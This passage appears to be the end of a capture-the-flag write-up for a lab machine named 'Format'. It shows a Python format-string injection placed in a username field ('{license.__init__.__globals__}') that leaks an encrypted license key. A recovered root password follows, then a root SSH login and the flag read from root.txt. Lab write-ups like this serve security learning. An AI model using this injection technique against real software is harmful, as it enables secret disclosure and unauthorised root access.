'cooper.dooper:gAAAAABjZbN1xCOUaNCV_-Q12BxI7uhvmqTGgwN12tB7Krb5avX5JdSzE2dLKX53ZpHxHrzpNnAwQ6g1FTduOtBAl4QYRWF27A2MPfedfMzgNZrv_VqUwCAfzGZeoQCv1-NBIw6GaoCA0yIMPl0o3B6A2_Hads32AsdDzOLyhetqrr8HUgtLbZg=\n', 'prefix': 'microblog', 'username': '{license.__init__.__globals__}', 'firstlast': 'testtest'}hwC0eF4D/SBq),EEbrxl4*L6-7P&MC>mpl9lx=eLtesttest

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABkYOj1W16lhYTuiiDV15eg54mTLAkpcpV0XmpyMpbaeW7zfM6tRrRla7Otlpmxca8YZa5UsuSUw79fGVVeQx5gRf4riiVAHkHQ6v8C1VuZ4W0zUYWFBfPnWElxNnUKAMR32CK6wkS1r8GUZyQNJLua9jwPeOK7znWyQfvIYcZ4tz2es97M5_H8hpHakhcJZPS4eLdr2E-9Zjjg5YL5EpXIycOuIDPxmPRecng_vW4WaPkvwu12N0vqAhfIaEK0OHNwPwh3xnASqvpaGfPXvx0l-InK57nQPiCLcIMV3jLvUHq94-q_Z3YE453JNWI_Ow6FBB0g5i7A-WDP2WmV11L8H9uLWqUIgTZvbJbBWSCXBTzeeTWYSXdPhKHBAQitxZ2_JEpPrh5DTFHewweVAxuwJKnrgp5cQD0gTtkAEJJRijrrJ6Yf5sbdYoRY_YWkwGtZivRp1SbNtgpVnLfxEIh8eMQ012AQUrSERn6oOM-OuYBD0v8X68Dqnhk55AyLI4wmyJDTgmyIvqpeXllWyhzFfUbBtIraNM-Zu96KCMayADgl6uGadSvnDKBXwCCQDmReCEAomiNSWNOHUNf6_PLQeuCUnnWi_c2qtG9ej9R1w1eQJRkWm4_dUe1rkRcTXKQhhKVpAYOu6VgsXUS3x8RBtOgZb7Su5ZA1EbiL04Fp-djuKf_H7EzXFzcQeHz6D0kP7l10kFqMt8N2pKuancvgoQDn8Z0FxK7M9pSSNDVse2H1r-P3Lzn6HtE9O3-0fE8v7ZO2JagZY6_Oew34sBSJbMWGYNtGTPAIXOS50QpTuoaEvBXUXuF-zAUussBcCH-b5MaW2liLP8EdaSKdmNiXRRq-t-F7vjj47vcailIOrKZ20dRdExzVyNRuSQ64Uq5r0z-OIAU0Iazp1DT7mRurj2c5oS9Hp5dEDi-BoKjQjkvhv8txlC2PpSXsLgVIfsdqjF19kxxF-HFqU8_J_8HZJa84QC0c45CyGEVmvhLYAVGDNVoQdUEB0G19JQWkvoFdFYr00_fUvGgmfnXpLm0TEMgmUmO6anLguuXNvfPhYeurGpKUqHDSBvJ5cWIKh1lR6o8XTOU0GMNP1IQHspGZ8tNNBAYJjXoI0FtSnZhdfDOidJhh5iBo7StEOPYR2plSSn6oIy4Ajkaj7KvpqBaYjPchad7gw7Heg1-S-3wmduqHDzfVtlexuHe0SKIezt2pxAqhErFd4OygifbGjCCSH0uczDtelzpsdpx9im4GGGVzt7tSWzog0eEboVIWbsMy8rPDC_wfNU8Rg5T3O2RRd8Npcgxnaf2PhstbseLGm3eip2mXnt8z157RXqWTyqkuSF4AL496-q2IDaDdf-CBc2xCnB4bHsJIsjvsmiq71HuLI_frhXK-acB2MIVhN4SxljqIerheKC1nZ7ZM7790FoYoAoNgSzCalHGogL7sjG-m5Ddem3v-aNNvIclukbxEwwdG_AVamhWe9hWiavx1ingXKQ9byENsIZxxQcACZuB74aIBPO3wQXesfQOQJ-fmD_LhGjlwpl3vR4iJV0GVUXeQdTA_4FkLVKtDM7uqQwHUcn7qH2MST8Nu205iZKD8_T__JPBWh8zHx9fUDprgwpHE3MNzoAuPlodPfmXNraONYPrML-RSNNp5dTHwYe9im3pIyCpzAhN78TWKXBjOBAqq5vAqNHf7vD2RwoiBZVbHfN8yQ-gOnx6cjE_A9OnKmdsLiNs_keuQjQubHgrtEDoE8_S-UXR2OxY9ZpdT7o9vzTkSZFtJ2u4q-32-X0TCVgPDs7dVzfa-jZ0n9w0b6ldwC04TmhIlGbJ8WbGkDbWAiOntO09COGklJ7Q49DD_28SQQ2TbellXKx0DyRU-_qM3Rxs-RSW0Kx2c_pO76wObGE6ufDvnFAgk2YQSRU0DrbPuMv04JHAh-G6wuVOSIiF3f1poWL_uCHJPJRn6S-ZHvSUBieaOFqg2rCvig-owaR6HIpPhDIF-Q2VH2ImZYBE9AsyOQf3t-ubEBQdkLjg7tRq7NhwvLieSzzjMjGNsCh44bbW2mHQjm0R6ubUtlTrdgFKvk7gNIlaghd3ZExWn7yJiVfBvB7W0K_5DIdsw9Dose-o9vuO-zGzeROz5eT9KRlzFJRl9JZD9w2s2dqcs2gYTat2wrQIYt3qB5vz3YvarG2UBHVjZMHHFhRmmcSizMcKrzOt0ESkEYus26X2H9-fyeUMdxl7X5eat9o-anok_rUfEN-deK_GtGsdA96mVpZngmwpIKlN3Rz2uIqgLKyJIEF-DVsp01gU4oB7ZTUqJ1fZtj3wOWNF9gF1Hvx7iZwmK94hhRIMNzHORiiq9lgwiyk9_X8-KZEHeBo_XVZ9Yv7i8eDQfPtZD7QpQuEKWi6Bz0kK9JxmYcSLNn6kh9QG1tuGMhhOaAHNCnv9QKMktuQEwWLwhoCEQ6GfuwKPcY29KRn3lLET5DHstv718Khu1_UNBL60V2U8bDR4HThkUIk5RRkNsibfikYMBp1ULxtJGFO0cyVJ-F19UxveaY2Lve5i6UQsQjnborABCYLJdL3XRwqzvlPUXD49KYLhWDH9eWKMlcYIi5fXaSEs0ug0yg6VkVbHnziepFD3Wn3lUq7ChoM6n6LGiBPBqzRG5bf3bkgRq9H8YlGzQPo-eDXRuY0IRCTWx_1csRJ40H504kY-w-JYqKXC8lFMfigd38dCJKT-kjLlSafuZ9tSb4csWPvh_3XxZIIVBylwiLc4uiV0lQN5MuD7nQNTxOQk-CQXinA9tIFAkfUvcRZSCdyLwsQv8tU1cPJPgdUjWmXT-CoANBCJ7FHeActKs-kTc5VwGuM2U3z3kbp_uEKb_l7NXYwEMAKwPG-e9y6ASaWvU27q2Kow3YHCFWS2v7eB4WupInUpsqvfobvPSmTxLL4XM6n7jKqYX2ZXJEpqRtkEenWGzVQsRRlmJM1UaQZo-1RvP79A2hc7KhelqHDganPxsAXpZX5jkeEbMzyMg1GjF_FJk0jQYOhme-zD_bLWm72DHXZYlO8x8awn9NPvwfQjohWukA-hUwtqPUQxEHP-1-isrStL4q7qH38Xn05CAgyEVlS7qbb8JWz5NHDYdwB1lw7wqripxUlIGdbKeoemq8Gn9DFwPEletiioqQs3o0UgTiZ9GkEsMsy0mvpnhxLWup0jyODli-NrxiSzQyvuz6IZzY-goCQKzd3BApXJoDh0RPYFfdajxeaUq1YJm1agln3NHsYce7M-JMF3bVq36FPTOwkJt3U4mfADhsnGCzxWDWy-OQ89qgkKQ5Np3xAP-7lAxuaUfk7PbTadIlrZdxSBBl3a30wEllc42-nOQbBhJee-x1nU-tIHKj9YKrujkXEUQlIpFRxF7IsTYQ-z3SK6PZokiMvEl_PbqT_oxAW638UHt5uWXkKrHh4O6ECJFKAjvN7PYHieBiGZNyAu92rweqPGRLcMPgPqkoc2xdmNDdCXuQ9ZaPgK2QZChhttF6Nb52D_MwmfPyeGyGM3RXnJv8ex0dQS9_uSp1E3g_K8IEpOKjf7gSdl0N8VqVaN4w39gZQOueV9yU4hGAVHmpssIAFy6X4azLjQ70rKsLKeeqWS-zl9Ky60CgMzIEGaMOe2bl-JS8Gu2ZF7idlvtPXk-BOOx-P2Lqzjhgl0uA_0YxNxlAUu4uJZFzcWGIJbWyoxBW_bQjv77HQuC1Sywpf30rCA2sJOlkfE5vAuUh5gJ1z16qhiMKy1C4qMZ-tw=
```

| Password |
| --- |
| unCR4ckaBL3Pa$$w0rd |

```c
$ ssh root@microblog.htb
root@microblog.htb's password: 
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May  8 20:01:12 2023 from 10.10.14.31
root@format:~#
```

## root.txt

```c
root@format:~# cat root.txt 
cc6ed54479941a8e46e0e1c894cda0cc
```
